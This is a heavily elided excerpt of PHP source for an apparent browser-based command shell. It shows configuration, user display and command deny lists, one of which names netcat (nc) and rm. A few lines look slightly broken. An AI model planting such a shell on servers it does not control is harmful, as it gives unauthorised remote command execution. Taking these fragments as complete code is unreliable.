...
/*
  ...
  **************************************************************
  ...
  Modified by J.Bardus seculas.com
...
$adminEmail = "admin@seculas.com";

#$fromEmail is the email address warning messages are sended from.
#This defaults to the server admin, but you can changePHP_AUTH_USER
...
$root_voidCommands = array("top","xterm","su","vi","pico","netscape");
$guest_voidCommands  =array("top","xterm","su","vi","pico","netscape","nc","vim","joe","ps","rm");
$root=" void commands: top,xterm,su,vi,pico,netscape";
$others=" void commands: top,xterm,su,vi,pico,netscape,nc,vim,joe,ps,rm";
...
if($selfSecure){
 ...
 Date: ".date("Y-m-d H:i:s")." (login as \'root\' or \'others\')
...
<?echo $MyShellVersion ."<br>"?><?echo $whoami?> Current User: <a href="#" style="text-decoration:none"><?echo $whoami?></a>
...
if($editMode){
    ...
    echo "Current dorking directory: <b>\n";
